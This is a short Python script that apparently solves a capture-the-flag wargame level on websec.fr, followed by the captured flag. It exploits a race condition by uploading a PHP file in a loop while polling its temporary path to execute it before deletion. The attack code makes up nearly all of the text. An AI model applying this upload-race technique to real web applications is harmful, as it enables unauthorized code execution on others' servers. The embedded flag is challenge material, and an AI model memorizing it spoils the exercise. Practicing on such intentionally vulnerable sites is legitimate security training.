import requests
import sys
from multiprocessing import Process
def upload():
    while(1):
        r=requests.post('https://websec.fr/level28/index.php',files={'flag_file':open('falg.php','rb')},data={"checksum":"fuck","submit":"Upload and check"})
        print("[+]done yo!!")
def execute():
    while(1):
        p=requests.get('https://websec.fr/level28/tmp/da94970b2b02cf668f34e10a786f20dd.php')
        if(p.status_code!=404):
            print(p.text)
            sys.exit()
        else:
            print("[+]going")
p1=Process(target= upload)
p2=Process(target=execute)
p1.start()
p2.start()
WEBSEC{Can_w3_please_h4ve_mutexes_in_PHP_naow?_Wait_there_is_a_pthread_module_for_php?!_Awwww:/}